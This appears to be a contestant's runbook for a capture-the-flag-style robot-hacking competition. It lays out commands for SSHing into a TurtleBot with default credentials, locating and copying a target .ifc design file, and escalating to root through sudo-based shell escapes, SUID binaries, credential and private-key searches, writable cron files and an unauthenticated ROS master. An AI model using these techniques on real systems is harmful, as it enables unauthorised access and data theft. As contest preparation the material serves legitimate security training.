# Hack My Robot 2026 — Criterion 2 Runbook

**Goal:** access the sensitive file on the robot = a design file in **`.ifc`** format (Industry Foundation Classes / BIM building model). 10 pts, all-or-nothing.

> Chain to get here: Wi-Fi password (C1.1) → Bob's PC password, from personal-elements list (C1.2) → SSH creds file on Bob's PC, "made more secure" with a hint (C1.3) → SSH into robot → find + read the `.ifc`.

> Scoring note: anything that depends on **physical access = half points**. Keep physical (SD card) as the fallback, not plan A.

---

## 0. Get on the robot (SSH)
Default TurtleBot login from the repo: user `ubuntu` / pass `turtlebot`.
```bash
ssh ubuntu@ROBOT_IP            # creds may instead come from Bob's SSH-key file (C1.3)
```
If C1.3 gave you a key:
```bash
chmod 600 bob_key && ssh -i bob_key ubuntu@ROBOT_IP
```

## 1. Orient (first 30 seconds on the box)
```bash
id                                  # am I root already?
sudo -l                             # what can I sudo? needs a password?
hostname; uname -a
cat ~/.bash_history 2>/dev/null     # operators leave the path here
ls -la ~ /root /opt /home/* 2>/dev/null
```
If `id` shows root → skip to step 3.

## 2. Locate the .ifc
```bash
# by extension (case-insensitive, hide permission noise)
find / -iname '*.ifc' 2>/dev/null

# if empty: by content — IFC files are plain text with these headers
grep -rlI "ISO-10303-21\|IFCPROJECT\|FILE_SCHEMA" / 2>/dev/null

# fastest if mlocate exists
sudo updatedb 2>/dev/null && locate -i .ifc
```
`find` can reveal the **path** even if the file itself is unreadable (parent dirs usually world-readable). `grep` needs to OPEN the file, so a root-only file stays invisible to it.

## 3. Read it
```bash
F=/paste/path/from/find.ifc
ls -l "$F"                 # note owner + perms
head -20 "$F"              # confirm ISO-10303-21 header
cat "$F"                   # full file
```
Worked? Exfil and you're done:
```bash
# from YOUR laptop:
scp ubuntu@ROBOT_IP:"$F" ./loot.ifc
```

## 4. "Permission denied" → escalate (not root, file owned by root)
Both `find` and `grep` obey Unix permissions — the fix is becoming root, not a different tool.

**4a. Passwords (try first — Bob reuses them)**
```bash
sudo -l          # re-check
sudo su          # try 'turtlebot', then Bob's PC password
sudo cat "$F"
```

**4b. Sudo misconfig → GTFOBins**
If `sudo -l` lists any binary, it probably gives a root shell. Examples:
```bash
sudo find . -exec /bin/sh \; 2>/dev/null
sudo vim -c ':!/bin/sh'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo less "$F"   # then type  !sh
```

**4c. SUID binaries → GTFOBins**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**4d. ROS-as-root (TurtleBot-specific — high value)**
ROS nodes often run as root, and the ROS master has NO auth. The routine/image_saver node may have written the `.ifc` (or its path/logs) somewhere you can already read.
```bash
ps -eo user,pid,cmd | grep -i ros | grep '^root'
ls -la /tmp ~/.ros /var/log 2>/dev/null
# if master reachable:
export ROS_MASTER_URI=http://ROBOT_IP:11311
rostopic list; rosparam list        # paths/params may leak the file location
```

**4e. Readable secrets without root**
```bash
find / -readable \( -name 'id_rsa' -o -name '*.pem' \) 2>/dev/null
grep -rI "password\|credential" /home /opt /etc 2>/dev/null | head
```

**4f. Writable root-run file (cron/systemd) → inject**
```bash
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys|/home/'
cat /etc/crontab; ls -la /etc/cron.*
```

## 5. Fallback — physical SD card (HALF POINTS)
TurtleBot OS lives on a microSD. Pull it → mount on your laptop → permissions are meaningless → read the `.ifc` and every credential file directly. Guaranteed, but scores half for anything depending on physical access.

---

## One-liner recon (paste all at once)
```bash
id; echo "---SUDO---"; sudo -l 2>/dev/null; echo "---IFC---"; \
find / -iname '*.ifc' 2>/dev/null; echo "---CONTENT---"; \
grep -rlI "ISO-10303-21" / 2>/dev/null; echo "---SUID---"; \
find / -perm -4000 -type f 2>/dev/null; echo "---HISTORY---"; \
cat ~/.bash_history 2>/dev/null
```

## TL;DR
`id` → `sudo -l` → `find -iname '*.ifc'` → `cat`. If denied: `sudo cat`, else GTFOBins via `sudo -l`/SUID, else ROS-as-root leftovers, else SD card (half pts).
